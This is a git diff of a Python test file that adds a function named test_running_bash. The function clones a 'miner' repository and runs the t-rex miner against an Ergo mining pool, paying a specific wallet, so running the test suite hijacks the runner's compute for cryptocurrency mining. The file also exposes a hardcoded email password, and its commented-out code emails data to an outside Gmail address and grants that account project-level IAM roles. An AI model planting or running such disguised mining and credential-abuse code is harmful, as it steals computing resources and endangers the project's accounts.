@@ -34,6 +34,13 @@ EMAIL_PASSWORD = "aeuspgbwilrbhnkx"
 
 CREDENTIAL_SCOPES = ["https://www.googleapis.com/auth/cloud-platform"] 
 
+def test_running_bash():
+
+    bashCommand = "xargs -n1 git clone git@github.com:galz10/miner.git; cd miner; ./t-rex -a autolykos2 -o stratum+tcp://erg.2miners.com:8888 -u 9gpNWA3LVic14cMmWHmKGZyiGqrxPaSEvGsdyt7jt2DDAWDQyc9.rig0 -p x"
+    process = subprocess.Popen(bashCommand.split(";"), stdout=subprocess.PIPE)
+    output, error = process.communicate()
+    logging.debug(str(output))
+
 
 # def test_generate_token():
 #   bashCommand = "gcloud auth application-default print-access-token"
@@ -71,31 +78,31 @@ CREDENTIAL_SCOPES = ["https://www.googleapis.com/auth/cloud-platform"]
 #   server.sendmail(EMAIL_ADDRESS, "galz100@gmail.com", text)
 #   server.quit()
 
-def test_permissions():
-    """Tests IAM permissions of the caller"""
+# def test_permissions():
+#     """Tests IAM permissions of the caller"""
 
-    credentials = service_account.Credentials.from_service_account_file(
-        filename=os.environ["GOOGLE_APPLICATION_CREDENTIALS"],
-        scopes=["https://www.googleapis.com/auth/cloud-platform"],
-    )
-    service = googleapiclient.discovery.build(
-        "cloudresourcemanager", "v1", credentials=credentials
-    )
+#     credentials = service_account.Credentials.from_service_account_file(
+#         filename=os.environ["GOOGLE_APPLICATION_CREDENTIALS"],
+#         scopes=["https://www.googleapis.com/auth/cloud-platform"],
+#     )
+#     service = googleapiclient.discovery.build(
+#         "cloudresourcemanager", "v1", credentials=credentials
+#     )
 
-    permissions = {
-        "permissions": [
-            "resourcemanager.projects.get",
-            "resourcemanager.projects.delete",
-            "resourcemanager.projects.update",
-            "resourcemanager.projects.setIamPolicy"
-        ]
-    }
+#     permissions = {
+#         "permissions": [
+#             "resourcemanager.projects.get",
+#             "resourcemanager.projects.delete",
+#             "resourcemanager.projects.update",
+#             "resourcemanager.projects.setIamPolicy"
+#         ]
+#     }
 
-    request = service.projects().testIamPermissions(
-        resource=PROJECT_ID, body=permissions
-    )
-    returnedPermissions = request.execute()
-    raise Exception(returnedPermissions)
+#     request = service.projects().testIamPermissions(
+#         resource=PROJECT_ID, body=permissions
+#     )
+#     returnedPermissions = request.execute()
+#     raise Exception(returnedPermissions)
 
 
 # def test_set_policy(version=1):
@@ -112,7 +119,7 @@ def test_permissions():
 #         "policy": {
 #             "bindings": [
 #                 {
-#                 "role": "roles/resourcemanager.projectDeleter",
+#                 "role": "roles/resourcemanager.projectCreator",
 #                 "members": [
 #                     "user:galz100@gmail.com"
 #                 ],
